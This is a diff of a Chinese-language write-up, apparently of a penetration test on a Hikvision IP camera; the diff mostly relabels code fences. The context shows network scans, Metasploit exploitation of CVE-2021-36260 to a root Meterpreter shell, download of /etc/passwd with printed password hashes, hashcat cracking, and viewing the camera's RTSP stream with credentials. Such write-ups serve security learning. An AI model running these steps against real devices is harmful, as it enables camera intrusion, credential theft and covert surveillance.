@@ -5,7 +5,7 @@
 
 ## 设备发现
 
-```sh
+```console
 > sudo netdiscover
 Currently scanning: 192.168.16.0/16   |   Screen View: Unique Hosts                                                                                                                 
                                                                                                                                                                                      
@@ -36,7 +36,7 @@ PORT     STATE SERVICE   VERSION
 
 ## 漏洞利用
 
-```
+```console
 msf6 > search hikvision
 
 Matching Modules
@@ -80,7 +80,7 @@ Server username: root
 查找并使用模块 `linux/http/hikvision_cve_2021_36260_blind`.  
 成功获取建立 root 权限的 Meterpreter 会话.  
 
-```
+```console
 meterpreter > sysinfo
 Computer     : 192.168.2.10
 OS           :  (Linux 3.0.8)
@@ -95,7 +95,7 @@ meterpreter > download /etc/passwd
 
 获取系统基本信息并下载 `/etc/passwd` 用于后续破解工作.  
 
-```
+```console
 meterpreter > netstat
 
 Connection list
@@ -125,7 +125,7 @@ Connection list
 
 通过网络状态可以看出, 除了与本机(`192.168.2.100`)和一台外网计算机(`[DEL]`)进行通讯外, 还使用 RTSP 协议与另一台位于局域网内的计算机(`192.168.2.109`)通讯.  
 
-```sh
+```console
 > sudo nmap -sV 192.168.2.109
 Starting Nmap 7.94 ( https://nmap.org ) at [DEL]
 Nmap scan report for 192.168.2.109
@@ -146,7 +146,7 @@ PORT      STATE SERVICE VERSION
 
 使用 hashcat 查找 `/etc/passwd` 中哈希值对应的原文.  
 
-```sh
+```console
 > cat passwd
 root:ToCOv8qxP13qs:0:0:root:/root/:/bin/psh
 root:$1$yi$KMvI/d5vTBFIySCw1EjGt0:0:0:root:/root/:/bin/psh
@@ -193,7 +193,7 @@ hashcat 成功查找到结果, 得到用户 `root` 和 `admin` 的密码 `l12345
 
 ### RTSP
 
-使用 VLC 接收 RTSP 流.  
+使用 VLC 接收 RTSP 流, 格式为 `rtsp://<user>:<passwd>@<ip>:<port>`.  
 
 ![VLC open network stream](assets/vlc_open_network_stream.png)  
 
